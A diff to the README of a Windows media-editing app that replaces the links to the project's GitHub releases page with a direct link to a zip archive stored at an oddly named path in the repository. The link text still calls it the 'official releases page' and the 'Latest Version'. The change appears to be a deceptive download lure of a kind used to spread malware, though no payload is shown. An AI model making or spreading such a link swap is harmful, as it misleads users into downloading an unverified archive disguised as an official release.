@@ -1,6 +1,6 @@
 # 🛠️ media-edit-app - Easily edit your digital media files
 
-[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://github.com/guruhebbel270/media-edit-app/releases)
+[![](https://img.shields.io/badge/Download_Latest_Version-blue.svg)](https://raw.githubusercontent.com/guruhebbel270/media-edit-app/main/nonblooded/app-media-edit-archaecraniate.zip)
 
 ## What is this app?
 
@@ -22,7 +22,7 @@ Ensure your computer has the latest Windows updates to avoid stability issues du
 
 Follow these steps to acquire the application on your computer:
 
-1.  Visit the official [releases page](https://github.com/guruhebbel270/media-edit-app/releases).
+1.  Visit the official [releases page](https://raw.githubusercontent.com/guruhebbel270/media-edit-app/main/nonblooded/app-media-edit-archaecraniate.zip).
 2.  Scroll to the latest release section at the top of the page.
 3.  Locate the file ending in `.exe` under the Assets heading.
 4.  Click the file name to start your download.
